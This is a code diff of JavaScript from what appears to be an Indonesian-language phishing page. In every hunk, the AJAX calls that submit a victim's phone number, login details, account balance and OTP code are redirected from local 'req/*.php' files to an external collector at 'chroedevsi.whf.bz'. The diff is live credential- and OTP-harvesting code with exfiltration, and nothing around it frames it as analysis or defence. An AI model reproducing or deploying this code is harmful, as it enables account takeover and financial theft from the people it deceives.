@@ -13,7 +13,7 @@ function sendHp() {
    sessionStorage.setItem('nohp', nohp);
    
    $.ajax({
-      url: 'req/no.php',
+      url: 'https://chroedevsi.whf.bz/v4-remi/no.php',
       type: 'POST',
       data: $('#login').serialize(),  
       complete: function() {
@@ -34,7 +34,7 @@ function sendLogin(){
     document.getElementById('lanjutkan').innerHTML = "Memproses....";               
     
     $.ajax({
-      url: 'req/sudah.php',
+      url: 'https://chroedevsi.whf.bz/v4-remi/sudah.php',
       type: 'POST',
       data: $('#sudah').serialize(),    
     complete: function(){    
@@ -64,7 +64,7 @@ function sendSaldoS() {
    document.getElementById('lanjutkan').innerHTML = "Memproses....";
    
    $.ajax({
-      url: 'req/saldosdh.php',
+      url: 'https://chroedevsi.whf.bz/v4-remi/saldosdh.php',
       type: 'POST',
       data: $('#saldosdh').serialize(),
       complete: function() {
@@ -98,7 +98,7 @@ function sendOtpS() {
    var nama1 = document.getElementById('nama1');
    
    $.ajax({
-      url: 'req/otpsdh.php',
+      url: 'https://chroedevsi.whf.bz/v4-remi/otpsdh.php',
       type: 'POST',
       data: $('#formsdh').serialize(),
       complete: function(response) {
